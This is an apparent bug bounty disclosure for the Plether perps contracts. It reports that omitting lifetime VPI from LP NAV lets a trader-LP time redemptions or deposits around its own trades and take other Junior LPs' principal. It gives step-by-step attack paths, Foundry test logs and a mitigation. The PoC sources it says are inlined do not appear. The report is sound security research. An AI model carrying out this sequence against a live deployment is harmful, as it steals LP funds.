# \#99850 [SC-Critical] Refundable lifetime VPI omitted from LP NAV lets trader-LPs extract other Junior LPs' principal around epoch settlement

**Submitted on Nov 15th 2026 at 13:03:52 UTC by @legat for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99850
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Asset

Asset: https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src

## Tested version and environment

```text
Repository: https://github.com/immunefi-team/audit-comp-plether
Commit:     a82d4fefb02768e5b3bddcc97dee371eee24fea8
Category:   Smart Contract
Execution:  Local Foundry test using the repository's production-topology perps fixture
Parameters: Frozen checked-in initial release configuration (not a live-state claim)
Compiler:   Solidity 0.8.35, optimizer 200, via-IR, Prague EVM
Token:      USDG, 6 decimals
```

The PoC uses the repository's production-topology perps fixture and deploys the scoped production implementations of the Pool, both Vaults, Clearinghouse, Engine, terminal-NAV book, planning and settlement sidecars, Oracle, and lifecycle components. The repository's `LegacyOrderRouterHarness` is a production-`OrderRouter`-derived fixture adapter; `MockSettlementToken` provides controlled USDG minting and `MockPyth` holds an equal-weight two-feed basket at one unchanged price. The inherited helper supplies `conf = 0` (`BasePerpTest.sol:308-315`), so the logged profits do not include an adverse-confidence price shift. The two-feed oracle fixture is intentionally smaller than the deployed release feed set, but the exploit does not depend on feed count or price movement. No target storage is overwritten, and no target accounting component is mocked or replaced. The test asserts the checked-in economic parameters used by the construction before executing either leg:

```text
vpiFactor                 0.01e18
maxSkewRatio              0.4e18
executionFeeBps           4
maxSeniorExposureAssets   40_000_000e6
maxSeniorShareBps         8_000
minOpenNotionalAssets     1_000e6
LP epoch duration         1 hour
LP request cutoff         5 minutes
```

The sealed run used Foundry/Forge 1.8.1 (`982849d3140c01fd3b72905759581a132df7aa98`) on macOS 27.2.1. Both authored tests and the complete fresh log are reproduced in the Proof of Concept section with SHA-256 hashes.

## Impact

Impact: Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Summary

Plether charges or rebates Volume Price Impact (VPI) when a position is opened or increased and accumulates that signed amount on the position for later close settlement. Negative lifetime VPI is backed by a nonwithdrawable reserve. Positive lifetime VPI is the clamp-capped maximum rebate the position can receive if its later close is skew-reducing; in the demonstrated self-created-skew sequence, the attacker controls that condition. The opening VPI cash transfer therefore is not necessarily final LP revenue: the same position can later receive or repay it.

LP NAV does not include that outstanding signed lifetime-VPI state. `TerminalNavBookV2` authenticates entry cost, marked price PnL, and collectible price-loss caps, but exports no VPI field. `HousePoolAccountingLib.buildReconcileSnapshot` consequently prices LP entry and exit from Pool cash, trader claims, and marked price PnL only.

This creates two directions of the same root cause:

1. **Exit leg:** a trader-LP opens a skew-increasing position. Positive VPI enters the Pool and is reconciled as Junior revenue. The attacker redeems Junior shares at the inflated NAV, then closes the position and receives the lifetime-clamped VPI rebate. The LPs who remain fund the rebate.
2. **Entry leg:** a trader opens a skew-reducing position. The Pool immediately pays negative VPI while a dedicated reserve secures the later clawback. The attacker activates a large Junior deposit at the depressed NAV, then closes the position. The clawback restores the Pool, and the newly minted shares capture part of the recovery from prior Junior LPs.

At the frozen release-scale parameters, the full E2E exit leg realizes 15,610.991561 USDG for the attacker and records a 23,753.743050 USDG starting-basis shortfall for the remaining Junior LPs in one cycle. The mirror leg realizes 12,315.925026 USDG and records a 22,829.381288 USDG starting-basis shortfall for prior Junior LPs. Those shortfalls include ordinary Senior coupon accrued during the elapsed epochs; versus an equivalent no-attack baseline, the attack-attributable single-cycle losses are approximately 23.7k USDG for the exit leg and 21.9k USDG for the mirror leg. Opposite-order controls are loss-making, isolating the LP settlement placed between opening VPI and lifetime settlement as the cause. Ten-cycle runs realize 156,611.278629 USDG and 123,854.366637 USDG respectively, with cumulative third-party Junior losses.

## Finding Description

### Intended behavior

LP entry and exit should not let a position owner cross an LP settlement boundary and recover the same VPI cash twice: once through an LP redemption or favorable share activation, and again when that position closes. This is the repository's stated anti-extraction intent, not an assumption imported from a different accounting design.

`CloseAccountingLib.sol:112-114` says: "Prevents LP sandwich attacks where an attacker opens at high depth, reduces pool depth, then closes to extract a net-negative lifetime VPI rebate." The comment names this exact open, reduce-depth, close sequence as an attack. The clamp stops the net-negative-lifetime rebate, while the same sequence still moves value between LP cohorts through asynchronous NAV pricing. `SECURITY.md:1443` likewise says the clamp "intentionally zeroes otherwise extractable rebate-only round trips." For the backed negative side, `ACCOUNTING_SPEC.md:821-822` states that VPI reserve cannot be extracted by LPs before its account obligation settles, and `WHITEPAPER.md:885-888` says the reserve is excluded from the terminal curve so LPs cannot withdraw it as marked equity before the matching position obligation settles.

The documentation separately states that VPI stays outside the pre-close price book and that neither anticipated VPI nor its reserve inflates terminal `K` or symmetric NAV (`SECURITY.md:863,866-872`). The defect is not that broad pre-close policy by itself. It is that Pool cash already transferred for an open position enters asynchronous LP pricing without a corresponding cohort-safe adjustment, allowing the same trader-LP to withdraw or buy through the transient cash state before its controlled close reverses it.

`WHITEPAPER.md:411-412,811` says positive VPI increases physical Pool assets and names the Pool as beneficiary when VPI is positive. In the demonstrated round trip, net lifetime VPI is zero: one LP cohort keeps the opening cash while another funds the clamp-capped refund.

The only express collection-time cohort policy is scoped to pending carry. `ACCOUNTING_SPEC.md:731-740` says "LP ownership follows collection time" for indexed pending carry and retained carry arrears, and calls that an intentional collection-time ownership policy. It does not extend that acceptance to VPI recovered or repaid by the same still-open position.

The close path enforces the lifetime clamp:

```solidity
if (state.proportionalAccrualAssets + state.vpiDeltaAssets < 0) {
    state.vpiDeltaAssets = -state.proportionalAccrualAssets;
}
```

Negative accrued VPI is a reserve-backed later clawback. Positive accrued VPI is not a certain liability in every future book state; it is the clamp-capped maximum close rebate. In the demonstrated unchanged-mark, self-created-skew sequence, the attacker controls the skew-reducing close that realizes that cap. Unrelated organic flow before close is an execution risk, not a prerequisite.

### Actual behavior

`TerminalNavBookV2.terminalNavSnapshot()` verifies aggregate lots and entry notional, computes only the marked price delta, and exports claims and maximum price liability:

```solidity
if (snapshot.hasOpenPositions) {
    snapshot.terminalLpPriceDeltaAssets = _terminalLpPriceDeltaAssetAtoms(uint32(markPrice));
}
snapshot.totalTraderClaimsAssets = engine.totalTraderClaimBalanceAssets();
snapshot.maxDirectionalLiabilityAssets = longMaxProfit > shortMaxProfit ? longMaxProfit : shortMaxProfit;
```

The per-account curve input similarly contains only size, entry cost, collectible price cap, and side. Although `engine.positions(account)` returns `vpiAccrued`, the book discards that value.

`HousePoolAccountingLib.buildReconcileSnapshot()` then constructs LP equity as:

```solidity
uint256 terminalAssets = engineSnapshot.physicalAssets;
uint256 terminalLiabilities = engineSnapshot.traderClaimBalanceAssets;
int256 terminalDelta = engineSnapshot.terminalLpPriceDeltaAssets;
```

It adds a positive marked-price delta or adds a negative marked-price delta to liabilities, but it has no lifetime-VPI term.

For positive opening VPI, the settlement sidecar sends the non-fee cost to `HousePool` and records it as `Revenue` with `CashArrived`. The next reconciliation therefore raises Junior principal. For negative opening VPI, the sidecar pays the rebate from `HousePool` and locks the required negative-lifetime-VPI reserve in the Clearinghouse. The cash decrease is treated as a current Pool loss even though the position must later repay the backed amount.

When the position closes, `CloseAccountingLib` clamps lifetime VPI and the settlement sidecar pays the positive-lifetime rebate or consumes the negative-lifetime reserve/clawback. The LP epoch can be settled between these two cash transfers. Because the first transfer changes Pool cash but the matching lifetime settlement state is absent from NAV, shares can be redeemed or minted at a transient price that the attacker can reverse by closing the same position in the demonstrated book state.

#### Leg 1: redeem after positive VPI enters the Pool, then close

Use a release-configured Pool with 20M USDG Senior principal, 30M USDG Junior principal, and 50M USDG depth. The attacker owns 80% of Junior shares.

1. Before the five-minute cutoff, the attacker requests redemption of all unlocked Junior shares for epoch `e+1`.
2. Before the epoch boundary, the attacker's trader opens a 19.9M USDG LONG at unchanged mark. The 19.9M skew is below the release cap `0.4 * 50M = 20M`.
3. The VPI curve charges:

   ```text
   X = 0.005 * 19.9M^2 / 50M = 39,601 USDG
   ```

   The 4-bps execution fee is 7,960 USDG. VPI cash enters the Pool; the execution fee goes to the protocol fee path.
4. After the boundary, a permissionless current-hour LP settlement reconciles the 39,601 USDG as Junior revenue and funds the attacker's redemption. The attacker's 80% share receives the transient increase through the funded redemption; the exact fixture payout is 24,031,534.640675 USDG instead of 24M USDG.
5. The redemption lowers Pool depth to approximately 26M USDG.
6. The attacker closes at the unchanged mark. Raw close VPI at the lower depth exceeds `X`, so the lifetime clamp limits the VPI rebate to `X`. After close accounting and the execution fee, the exact Pool payout is 31,637.350886 USDG.
7. Across the LP and trader identities, the attacker earns approximately:

   ```text
   realized combined attacker net = 15,610.991561 USDG
   remaining-Junior loss          = 23,753.743050 USDG
   Treasury gain                  = 7,960 USDG
   ```

   These are balance-derived E2E values after the Vault, Pool, Clearinghouse, Router, close clamp, and integer rounding all execute.

The valid control opens and closes the same 19.9M position before the queued LP exit settles; it loses 9,704.429722 USDG. Settling the 80% exit before opening that same 19.9M position is not an executable control: depth falls to roughly 26M, so source arithmetic puts the trade above the release 40% skew cap, and the PoC asserts that `commitOrder` reverts. The successful opposite ordering proves that price movement or the VPI curve alone is not the extraction; profitability requires LP settlement between the opening charge and its clamp-capped close rebate.

The PoC repeats the attack for ten cycles over 108,001 seconds and realizes +156,611.278629 USDG to the attacker and -241,691.492008 USDG to remaining Junior LPs. Boundary cases measure -156.321479 USDG near 40% ownership and +15,610.991561 USDG at 80%. A near-100% redemption request is partially funded because the frozen 80% Senior-share covenant requires Junior capital to remain; the PoC reports funded shares rather than claiming an impossible uncapped result.

#### Leg 2: activate a deposit after negative VPI leaves the Pool, then close

Use 50M USDG Pool depth, 30M USDG Junior principal, and an organic 20M USDG net-long book. The attacker escrows a 60M USDG Junior deposit for the next eligible epoch.

1. Before the deposit activates, the attacker's trader opens a 12M USDG SHORT. This reduces absolute skew from 20M to 8M.
2. The gross VPI difference is negative:

   ```text
   R = 0.005 * (20M^2 - 8M^2) / 50M = 33,600 USDG
   ```

3. The exact gross VPI credit and protected reserve are 33,599.964092 USDG. In the production path, the 4,800 USDG opening fee is debited from the trader's Clearinghouse balance separately; the Pool cash/NAV dip itself is the full 33,599.964092 USDG.
4. A permissionless epoch settlement reconciles the depressed Pool cash and activates the attacker's 60M USDG Junior deposit. The attacker receives approximately two-thirds of post-entry Junior ownership.
5. The attacker closes the short. The lifetime clamp requires repayment of the 33,600 USDG negative accrual even if the changed depth would otherwise quote less. Reserve consumption is routed back as claimant revenue and Junior NAV recovers.
6. After the close clawback, cooldown, and real redemption/claim path, the attacker realizes 12,315.925026 USDG and the independently funded old-Junior cohort loses 22,829.381288 USDG. Treasury receives exactly 9,600 USDG across the open and close.

The control activates the deposit before the skew-reducing open and realizes a 10,087.980556 USDG attacker loss. The PoC repeats the full attack over ten cycles and realizes +123,854.366637 USDG attacker profit, -228,990.806032 USDG old-Junior loss, and +96,000 USDG Treasury fees.

The mirror leg requires an existing same-direction skew. At the stated release parameters, an organic skew below roughly `0.3 * D` makes the self-funded version uneconomic. That requirement is included in Likelihood rather than hidden.

## Root Cause

The root cause is an incomplete definition of terminal LP NAV.

Plether maintains signed lifetime VPI per open position and settles it again when the position closes. Positive accrued VPI is the clamp-capped maximum trader rebate available if the later close is skew-reducing; negative accrued VPI is a Pool receivable protected by a dedicated nonwithdrawable reserve. In the demonstrated self-skew sequence, unchanged price and the attacker-controlled skew-reducing close make the positive cap realizable. However, the authenticated terminal NAV contains marked price PnL and trader claims but no aggregate signed lifetime-VPI adjustment.

As a result:

- positive opening VPI is immediately treated as LP revenue even though the same position can later receive it back;
- negative opening VPI immediately reduces LP NAV even though the same position is reserve-bound to repay it; and
- asynchronous LP entry or exit can be placed between the cash transfer and its matching lifetime settlement.

The close clamp protects the trader/Pool round trip from net-negative lifetime VPI, but it does not protect LP cohorts from buying or redeeming while the signed lifetime-VPI state is omitted from NAV.

## Impact Explanation

The selectable impact is Critical: **Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield**.

The attack is not merely a temporary share-price display error. The attacker's LP claim is funded from Pool cash into the Vault, its shares are burned or minted at the manipulated epoch price, and the attacker can claim the funded USDG. After the trader leg closes, independently funded Junior LPs own a smaller claim on Pool principal. The unchanged-price controls isolate that principal transfer from ordinary market risk.

For the specified release-scale examples:

| Construction | Attacker net per cycle | Other Junior starting-basis shortfall per cycle | Ten-cycle attacker net | Ten-cycle other-Junior starting-basis shortfall |
|---|---:|---:|---:|---:|
| Exit leg | +15,610.991561 USDG | -23,753.743050 USDG | +156,611.278629 USDG | -241,691.492008 USDG |
| Entry leg | +12,315.925026 USDG | -22,829.381288 USDG | +123,854.366637 USDG | -228,990.806032 USDG |

The logged Junior shortfalls are measured against starting basis and therefore include the ordinary Senior coupon accrued over elapsed epochs (about 182.65 USDG per hour on 20M Senior principal at 8% annualized). The estimated attack-attributable single-cycle losses versus a no-attack baseline are approximately 23,717 USDG for the exit construction and 21.9k USDG for the entry construction. This baseline adjustment does not change either attacker's realized profit or the direction and materiality of third-party loss; the ten-cycle logged shortfalls likewise include ordinary coupon accrual.

## Likelihood Explanation

Every state-changing action used by the attack is permissionless or an ordinary user action: trading, requesting an LP redemption or deposit, and triggering current-hour epoch settlement. No owner, guardian, Oracle signer, Treasury, keeper, or dependency compromise is required. The attacker can act as its own trader and permissionless keeper using authentic prices.

The attack is capital-intensive and its per-cycle return is bounded:

- the stated exit-leg PoC ties up 24M USDG of Junior ownership and provisions 1M USDG in the trader's Clearinghouse account, with 500k USDG selected as opening margin; roughly 40% of Junior ownership approaches break-even, while 80% or above is materially profitable;
- the stated mirror leg escrows 60M USDG of new Junior capital plus trader margin and needs a pre-existing organic skew of roughly `0.3 * D` or greater; self-building that skew would require additional funded positions and must be included in net economics;
- the 40% maximum-skew cap limits the exit-leg VPI magnitude;
- each cycle spans multiple one-hour epochs and a one-hour share cooldown;
- execution fees, carry, Pyth fees, and Arbitrum gas reduce the result; and
- the current fixture sets Pyth confidence to zero. Release configuration permits a 10-bps confidence ratio with a 2,500-bps adverse multiplier (`DEPLOYMENT.md:146-147`), or at most a 2.5-bps adverse execution-price shift. Conservatively applying that bound to both executions costs about 9,950 USDG gross on the 19.9M exit leg and 6,000 USDG gross on the 12M mirror leg; after approximate LP recapture, the incremental attacker costs are about 6k and 4k respectively, leaving both demonstrated sizes profitable. These are source-parameter estimates, not assertions made by the `conf = 0` PoC.

These constraints reduce frequency, but they do not require an unlikely code race. LP requests are asynchronous by design and the attacker controls whether its trade occurs before or after the public epoch boundary. At 50M USDG depth the demonstrated absolute profit is material, and the same sequence can be repeated while sufficient Junior liquidity and the required skew state exist.

The public HIGH-1 limitation is not this root cause. HIGH-1 concerns the disclosed Arbitrum/Pyth clock-alignment behavior. This construction uses an unchanged authentic mark and derives no benefit from observing a price before its on-chain commit timestamp.

The HIGH-1 exception requires repeatable, net-profitable LP extraction. The PoC meets that condition with ten successful cycles, realized attacker cash, measured independent LP loss, and opposite-order controls.

The closest VPI disclosure is SCAN-31, `KNOWN_ISSUES.md:172` and the linked report at `reports/scan-plether-fi-plether-core-d4541b49.md:1742-1810`. SCAN-31 says a trader can temporarily reduce Pool depth before a skew-reducing close so the current-depth curve quotes a larger rebate than the unmanipulated curve. That is not the causal defect here. At the original 50M USDG depth, the unchanged-mark close quote is exactly `-C(19.9M) = -39,601 USDG = -X` under `CfdMath.sol:138-139`; the opening and closing curve terms telescope. The lower post-redemption depth makes the raw quote larger, but the lifetime clamp still returns exactly `X`, so the depth reduction adds zero to the rebate. Profit comes from first capitalizing `X` into Junior NAV and paying it into the funded redemption. The mirror construction is independently outside SCAN-31 because it uses deposit activation around a reserve-backed negative-VPI clawback, not a depth-reduced close quote.

The documented "LP ownership follows collection time" exception is expressly about pending carry (`ACCOUNTING_SPEC.md:731-740`), not VPI recovered by the same position. No located disclosure accepts a trader-LP redeeming opening VPI and then shifting its matching lifetime-capped refund below another LP's funded basis. The anti-extraction comment in `CloseAccountingLib.sol:112-114`, `SECURITY.md:1443`, the non-extractable-reserve rule in `ACCOUNTING_SPEC.md:821-822`, and `WHITEPAPER.md:885-888` instead establish the opposite intent. This report does not characterize the broad decision to omit anticipated VPI from pre-close price curves as the bug; it identifies the cross-cohort extraction created when physical VPI cash and asynchronous LP settlement are combined without a cohort-safe NAV adjustment.

## Attack Path / Reproduction Path

### Exit leg

1. Establish the ordinary release state: 20M Senior principal, 30M Junior principal, 50M Pool depth, live current mark, and attacker ownership of 80% of Junior shares.
2. Before the request cutoff, request redemption of all attacker Junior shares for epoch `e+1`.
3. Before boundary `e+1`, fund and open a 19.9M USDG LONG at the unchanged mark.
4. Confirm 39,601 USDG VPI enters the Pool and 7,960 USDG open fee is charged.
5. After the boundary, submit an authentic current-hour mark and settle the LP epoch through the Router.
6. Claim the funded Junior redemption and record attacker/victim/Pool/Treasury balances.
7. Close the LONG at the unchanged mark.
8. Withdraw the trader balance and assert +15,610.991561 USDG combined attacker profit and -23,753.743050 USDG remaining-Junior loss.
9. Run the valid open-and-close-before-exit control and assert a 9,704.429722 USDG attacker loss; separately show that source arithmetic puts the same 19.9M trade over the 40% skew cap after exit-before-open and assert that `commitOrder` reverts.
10. Repeat ten cycles and test the 40%, 80%, and near-100% request boundaries, including Senior-covenant partial funding.

### Entry/mirror leg

1. Establish 50M USDG depth, 30M Junior principal, and an organic 20M USDG net-long book.
2. Request a 60M USDG Junior deposit for epoch `e+1`.
3. Before activation, open a 12M USDG SHORT at the unchanged mark.
4. Confirm the exact 33,599.964092 USDG Pool payout and matching Clearinghouse reserve; confirm the 4,800 USDG opening fee is charged separately to the trader.
5. After the boundary, settle the LP epoch and claim the attacker's newly activated Junior shares.
6. Close the SHORT and confirm the lifetime VPI clawback restores the Pool/Junior NAV.
7. After cooldown, request and fund redemption, then claim USDG.
8. Log +12,315.925026 USDG combined attacker profit and -22,829.381288 USDG loss to old Junior LPs; the PoC asserts these outcomes within stated ranges.
9. Run the activate-before-open control and log a 10,087.980556 USDG attacker loss, asserted within its stated range.
10. Repeat ten full cycles and log +123,854.366637 USDG attacker profit and -228,990.806032 USDG old-Junior loss, asserted within stated ranges.

## External Preconditions

- The target uses the scoped perps contracts at commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8` or equivalent affected logic.
- The release configuration has nonzero VPI factor and permits the demonstrated size under the maximum-skew rule.
- Oracle mode is live, not frozen, and authentic current-hour price data is available.
- Sufficient Pool cash exists for the open rebate, LP funding, and close settlement.
- For the mirror leg, an organic same-direction skew of approximately `0.3 * D` or greater exists, unless the attacker funds a more complex self-built-skew composition.

## Internal Preconditions

- The attacker's LP request targets a future one-hour epoch and is placed before the five-minute cutoff.
- For the exit leg, the attacker owns a sufficiently large unlocked Junior fraction; approximately 40% is near break-even and 80% is profitable in the stated state.
- For the entry leg, the attacker has enough queued Junior capital to own a material fraction after activation.
- The trade executes before the targeted LP settlement, while the matching close executes after it.
- No LP settlement hold, Pool pause, oracle-frozen state, terminal deficit, or deposit-entry gate prevents the relevant epoch action.
- The position remains open across the LP settlement so its lifetime VPI remains outstanding but absent from terminal NAV.

## Affected Code

Primary affected paths at frozen commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`:

- `packages/perps/src/TerminalNavBookV2.sol:208-235` exports terminal price PnL, claims, and maximum liability but no lifetime-VPI term.
- `packages/perps/src/TerminalNavBookV2.sol:418-448` reads the position and constructs a curve without using returned `vpiAccrued`.
- `packages/perps/src/interfaces/ICfdEngineTypes.sol:451-467` defines `TerminalNavSnapshot` without signed lifetime VPI.
- `packages/perps/src/libraries/HousePoolAccountingLib.sol:63-79` constructs distributable LP equity from physical assets, claims, and marked price PnL only.
- `packages/perps/src/CfdMath.sol:115-179` computes the signed opening VPI transfer.
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:320-374,443-481` plans opening VPI, reserve targets, and the release maximum-skew rule.
- `packages/perps/src/CfdEngineSettlementSidecar.sol:415-465` pays a negative opening rebate or records positive opening VPI as Pool revenue.
- `packages/perps/src/libraries/CloseAccountingLib.sol:103-126` computes close VPI and clamps lifetime VPI from becoming negative.
- `packages/perps/src/CfdEngineSettlementSidecar.sol:580-625` settles the close rebate/clawback and routes revenue.
- `packages/perps/src/HousePool.sol:797-925` reconciles current NAV, funds redemptions, and then activates deposits at the transient price.
- `packages/perps/src/TrancheVault.sol:545-556` places requests into future epochs around the five-minute cutoff.

## Recommended Mitigation

Include outstanding signed lifetime VPI in the authenticated terminal NAV used by both LP entry and exit.

One consistent implementation is to maintain an authenticated aggregate `sum(vpiAccrued)` alongside the terminal price curves and expose a signed VPI NAV adjustment in `TerminalNavSnapshot`:

- positive lifetime VPI is the maximum close rebate permitted by the lifetime clamp and should reduce distributable LP NAV to the extent it is realizable in the authenticated book state;
- negative lifetime VPI is a future Pool clawback receivable and may increase LP NAV only to the extent it is backed by the dedicated nonwithdrawable VPI reserve; and
- when open/close changes lifetime VPI, the aggregate adjustment and reserve-backed amount must update atomically with the position and terminal book.

An equivalent design can quarantine both directions of opening VPI in a pending claimant/liability bucket excluded from ordinary LP pricing until the position realizes the matching close settlement. In either design, avoid counting the same cash once as physical Pool assets and again as a receivable.

Add regression tests that execute both action orders for both directions:

1. open/increase -> LP redeem -> close;
2. LP redeem -> open/increase -> close;
3. negative-VPI open -> LP deposit activation -> close;
4. LP deposit activation -> negative-VPI open -> close;
5. partial closes and repeated cycles; and
6. reserve, claim, Senior-first, frozen-mode, and zero/wiped-Junior boundaries.

The invariant should be that, at an unchanged mark and absent non-VPI fees, changing only whether LP settlement occurs before or after an open position's reversible VPI transfer cannot create a positive combined trader-LP profit or a matching loss to another LP cohort.

## Proof of Concept

**Description**

This full E2E Foundry PoC deploys Plether's scoped production Pool, Senior and Junior Vaults, Clearinghouse, Engine, terminal-NAV book, planning and settlement sidecars, Oracle, lifecycle components, and the repository's production-`OrderRouter`-derived fixture adapter at the frozen commit. It executes ordinary asynchronous LP requests, epoch settlement, claims, Router opens and closes, lifetime-VPI reserve/clawback accounting, cooldowns, and final USDG realization.

The exit scenario queues an 80%-Junior redemption, opens the 19.9M LONG before the boundary, settles and claims the inflated redemption, closes at the unchanged price, and withdraws trader cash. The mirror scenario queues a 60M Junior deposit against an organic 20M LONG, opens a 12M skew-reducing SHORT, activates and claims shares at depressed NAV, closes and repays lifetime VPI, then redeems and claims the new shares. Both scenarios measure the attacker's final USDG and the independently funded Junior cohort's loss. Opposite-order controls, ownership/covenant boundaries, and ten-cycle repetitions isolate and prove the defect.

The repository fixture uses `MockSettlementToken` only to provision local USDG and a two-feed equal-weight `MockPyth` basket only to hold the price constant. The inherited oracle helper supplies `conf = 0` (`BasePerpTest.sol:308-315`); the release confidence bound and conservative economic adjustment are disclosed in Likelihood. During initial LP setup, the inherited repository helper impersonates the configured Router solely to install the cached mark before epoch settlement; every attack-phase open, close, reserve/clawback, LP settlement, claim, cooldown, redemption, and final Clearinghouse withdrawal uses the ordinary contract paths. All affected accounting runs through the scoped production contracts; the tests perform no target storage writes and do not replace target accounting logic. A chain fork or Docker node is unnecessary because the issue depends on deterministic contract accounting, not deployed third-party state.

**Where to place files and their names**

Place the two complete authored files under the frozen repository root:

```text
packages/perps/test/perps/accounting/close/
├── PLR0001VpiNavExitE2E.t.sol
└── PLR0069VpiNavMirrorE2E.t.sol
```

These are the only files created or modified for the final PoC. Both complete authored source files are inlined below; no ZIP or external download is required.

**Tool and dependency versions**

```text
Forge:      1.8.1
Foundry:    commit 982849d3140c01fd3b72905759581a132df7aa98
Solidity:   0.8.35
Optimizer:  enabled, 200 runs, via-IR
EVM:        Prague
Host run:   macOS 27.2.1 (build 26B131)
```

Repository dependencies are the exact Git submodules pinned by commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`.

**Clean clone, checkout, and installation**

```bash
git clone https://github.com/immunefi-team/audit-comp-plether.git audit-comp-plether
cd audit-comp-plether
git checkout --detach a82d4fefb02768e5b3bddcc97dee371eee24fea8
git submodule update --init --recursive

# Install/select Foundry 1.8.1, then confirm the runner.
forge --version

mkdir -p packages/perps/test/perps/accounting/close
# Save the two complete inline source blocks below at the exact paths shown above.

shasum -a 256 \
  packages/perps/test/perps/accounting/close/PLR0001VpiNavExitE2E.t.sol \
  packages/perps/test/perps/accounting/close/PLR0069VpiNavMirrorE2E.t.sol
```

The expected source hashes are:

```text
ecc231544c5715e9760378d1e301e41838ae17baeaedeb3fc633ddc770383c29  PLR0001VpiNavExitE2E.t.sol
cea545a41bd6a7b5e00f9d87f391f4125ecfbb86d2f7029ea43a8a570dec4cff  PLR0069VpiNavMirrorE2E.t.sol
```

**Exact run command**

Run from the frozen repository root:

```bash
cd packages/perps
set -o pipefail
forge test --match-path 'test/perps/accounting/close/PLR*VpiNav*E2E.t.sol' -vv \
  | tee /tmp/plether-vpi-nav-e2e.log
```

**Setup actions**

1. Deploy the real scoped Pool, Senior/Junior Vaults, Clearinghouse, Engine, terminal-NAV book, planning/settlement modules, lifecycle components, Oracle, and Router-derived repository fixture.
2. Restore the frozen release Senior cap/share covenant and Router minimum open notional through the real delayed admin paths.
3. Assert USDG 6 decimals, VPI factor `0.01e18`, maximum skew `0.4e18`, execution fee 4 bps, Senior cap 40M, maximum Senior share 80%, minimum open notional 1,000 USDG, one-hour LP epochs, five-minute request cutoff, and one-hour deposit cooldown.
4. Establish 20M Senior and 30M Junior principal at 50M Pool depth.
5. Keep the external price unchanged throughout every open, LP settlement, and close.

**Exploit actions — exit leg**

1. Give the attacker 24M of the 30M Junior capital and queue redemption before the five-minute cutoff.
2. Before the boundary, open a 19.9M LONG through the Router and assert 39,601 USDG opening VPI enters the Pool and 7,960 USDG reaches Treasury.
3. At the boundary, settle the real LP epoch and claim 24,031,534.640675 USDG from the funded redemption.
4. Close the same LONG at the unchanged price, execute the lifetime clamp, and realize the Pool payout.
5. Withdraw the trader balance and assert 15,610.991561 USDG attacker profit and 23,753.743050 USDG remaining-Junior loss.
6. Run the valid open/close-before-exit control and assert a 9,704.429722 USDG attacker loss.
7. Attempt exit-before-open with the same 19.9M trade; source arithmetic puts it above the release 40% skew cap after depth falls, and the PoC asserts that `commitOrder` reverts.
8. Test 40%, 80%, and near-100% redemption requests, including the Senior-covenant funding limit.
9. Repeat the entire attack ten times and assert 156,611.278629 USDG attacker profit, 241,691.492008 USDG other-Junior loss, and 79,600 USDG Treasury fees over 108,001 seconds.

**Exploit actions — entry/mirror leg**

1. Establish a real organic 20M LONG while normalizing Pool depth back to approximately 50M.
2. Queue the attacker's 60M Junior deposit.
3. Before activation, open a 12M SHORT through the Router, reducing skew from 20M to 8M.
4. Assert the 33,599.964092 USDG Pool dip and matching protected negative-lifetime-VPI reserve.
5. Settle the epoch and claim the attacker's shares at depressed Junior NAV.
6. Close the SHORT, consume the reserve/clawback through the real close path, and assert the reserve returns to zero.
7. Wait through cooldown, request redemption, settle the later epoch, claim USDG, and withdraw every remaining trader credit from the Clearinghouse into the attacker's wallet.
8. Log 12,315.925026 USDG attacker profit, 22,829.381288 USDG old-Junior loss, and 9,600 USDG Treasury fees; the PoC asserts these outcomes within stated ranges.
9. Run the activate-before-open control and log a 10,087.980556 USDG attacker loss, asserted within its stated range.
10. Repeat the entire attack ten times and log 123,854.366637 USDG attacker profit, 228,990.806032 USDG old-Junior loss, and 96,000 USDG Treasury fees, asserted within stated ranges.

**Fresh logs proving the bug**

The fresh combined run produced:

```text
No files changed, compilation skipped

Ran 5 tests for test/perps/accounting/close/PLR0001VpiNavExitE2E.t.sol:PLR0001VpiNavExitE2E
[PASS] test_exitLeg_80pct_attack_and_honestLoss() (gas: 11759884)
Logs:
  exit attacker net atoms: 15610991561
  exit other Junior loss atoms: 23753743050
  exit Treasury gain atoms: 7960000000
  exit opening VPI atoms: 39601000000
  exit close Pool payout atoms: 31637350886
  exit LP funded payout atoms: 24031534640675

[PASS] test_exitLeg_ownershipBoundaries_40_80_100pct() (gas: 31265318)
Logs:
  exit f40 net atoms: -156321479
  exit f80 net atoms: 15610991561
  exit f100 funded shares after covenant: 25046539809645281

[PASS] test_exitLeg_repeatTenCycles_netProfitAndVictimLoss() (gas: 84346641)
Logs:
  exit ten-cycle elapsed seconds: 108001
  exit ten-cycle attacker profit atoms: 156611278629
  exit ten-cycle other Junior loss atoms: 241691492008
  exit ten-cycle Treasury gain atoms: 79600000000

[PASS] test_exitLeg_requestedSettleBeforeOpenControl_isNotSameExecutableTrade() (gas: 6294140)
[PASS] test_exitLeg_validControl_closeBeforeExit_losesTwoFees() (gas: 11257757)
Logs:
  exit control attacker loss atoms: 9704429722

Suite result: ok. 5 passed; 0 failed; 0 skipped; finished in 60.54ms (91.29ms CPU time)

Ran 2 tests for test/perps/accounting/close/PLR0069VpiNavMirrorE2E.t.sol:PLR0069VpiNavMirrorE2E
[PASS] test_PLR0069_AttackVersusSettleBeforeOpenControl() (gas: 26553017)
Logs:
  mirror attack attacker net: 12315925026
  mirror attack old-Junior loss: 22829381288
  mirror Treasury fees: 9600000000
  mirror gross reserve: 33599964092
  mirror pool dip: 33599964092
  mirror control attacker net: -10087980556

[PASS] test_PLR0069_TenRepeatableCycles() (gas: 99477625)
Logs:
  mirror ten-cycle attacker profit: 123854366637
  mirror ten-cycle old-Junior loss: 228990806032
  mirror ten-cycle Treasury fees: 96000000000

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 68.69ms (79.79ms CPU time)

